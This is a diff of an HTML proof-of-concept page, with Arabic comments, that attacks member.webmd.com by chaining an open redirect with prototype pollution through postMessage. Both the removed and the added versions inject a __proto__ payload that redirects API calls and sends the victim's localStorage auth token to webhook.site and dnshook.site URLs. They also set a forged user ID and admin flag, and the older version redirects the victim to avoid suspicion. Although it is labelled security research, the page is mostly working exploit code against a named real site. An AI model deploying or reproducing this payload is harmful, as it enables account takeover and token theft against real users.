@@ -1,28 +1,82 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Security Research - POC Dashboard</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: #f8fafc; padding: 40px; text-align: center; }
+        .container { max-width: 800px; margin: 0 auto; background: #1e293b; padding: 30px; border-radius: 12px; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.5); }
+        .status-badge { background: #ef4444; color: white; padding: 5px 15px; border-radius: 20px; font-size: 0.8em; text-transform: uppercase; }
+        #logs { text-align: left; background: #000; padding: 15px; border-radius: 8px; margin-top: 20px; font-family: 'Courier New', Courier, monospace; color: #10b981; height: 200px; overflow-y: auto; }
+        button { background: #3b82f6; color: white; border: none; padding: 12px 24px; border-radius: 6px; cursor: pointer; font-size: 16px; margin-top: 20px; transition: 0.3s; }
+        button:hover { background: #2563eb; }
+    </style>
+</head>
 <body>
-<h3>PoC – Post‑Login Redirect Confirmation</h3>
-<pre id="out"></pre>
+
+<div class="container">
+    <h2>Proof of Concept: Prototype Pollution to ATO</h2>
+    <span class="status-badge">Target: member.webmd.com</span>
+    
+    <p>هذه الصفحة تحاكي هجوم "Chaining" بين Open Redirect و Prototype Pollution.</p>
+    
+    <button onclick="launchExploit()">ابدأ استغلال الثغرة (Launch Exploit)</button>
+
+    <div id="logs">
+        <p>> النظام جاهز للبدء...</p>
+    </div>
+</div>
 
 <script>
-    // الوصول إلى النافذة التي قامت بالتوجيه (التي لا تزال على WebMD)
-    if (window.opener) {
-        // إرسال السم للنافذة الأصلية
-        window.opener.postMessage({
-            type: "set-config",
-            data: {
-                "__proto__": {
-                    // حقن كود لسرقة التوكنات فوراً
-                    "tokenHandler": "javascript:fetch('اhttps://webmd.com.6400a8d9-6bff-4da3-9540-9ebf5bdcdfa0.dnshook.site/log?token='+localStorage.getItem('auth'))",
-                    "isAdmin": true
-                }
-            }
-        }, "*");
+    const webhookURL = "https://webhook.site/6400a8d9-6bff-4da3-9540-9ebf5bdcdfa0";
+    const logger = document.getElementById('logs');
+
+    function log(msg) {
+        const p = document.createElement('p');
+        p.innerText = `> [${new Date().toLocaleTimeString()}] ${msg}`;
+        logger.appendChild(p);
+        logger.scrollTop = logger.scrollHeight;
+    }
+
+    function launchExploit() {
+        log("فتح نافذة الموقع الضحية...");
         
-        alert("Account Information Synchronized!");
-        // إعادة توجيه الضحية مرة أخرى للموقع الأصلي لعدم إثارة الشكوك
-        window.location.href = "https://member.webmd.com/profile";
+        // 1. محاكاة الـ Open Redirect (فتح الموقع في نافذة جديدة)
+        // في الهجوم الحقيقي، الضحية يأتي من رابط Redirect رسمي للشركة
+        const victimWin = window.open("https://member.webmd.com/profile", "_blank", "width=800,height=600");
+
+        log("انتظار تحميل الـ JavaScript في الموقع الضحية (5 ثوانٍ)...");
+
+        setTimeout(() => {
+            log("إرسال Payload التلوث لسرقة التوكنات (ATO)...");
+
+            // 2. إرسال السم عبر postMessage
+            victimWin.postMessage({
+                type: "set-config",
+                data: {
+                    "__proto__": {
+                        // الفخ الأول: تغيير رابط الـ API لتوجيه البيانات لسيرفر المهاجم
+                        "apiEndpoint": webhookURL + "/stolen-api",
+                        
+                        // الفخ الثاني: زرع Getter/Setter لاختطاف التوكنات صمتاً
+                        "authToken": "hacked", 
+                        "setAuth": "javascript:new Image().src='" + webhookURL + "/exfil?token='+localStorage.getItem('auth_token')",
+                        
+                        // الفخ الثالث: تزوير هوية المستخدم داخل المتصفح
+                        "UserId": "999999999",
+                        "isAdmin": true
+                    }
+                }
+            }, "*");
+
+            log("✅ تم الحقن بنجاح! المتصفح الضحية الآن تحت السيطرة.");
+            log("أي محاولة دخول أو تغيير بيانات سيتم إرسالها للـ Webhook.");
+            
+            // إظهار تنبيه لتأكيد النجاح في الـ PoC
+            alert("Vulnerability Exploited!\nGlobal Prototype Polluted.\nCheck Webhook for incoming data.");
+        }, 5000);
     }
 </script>
+
 </body>
 </html>
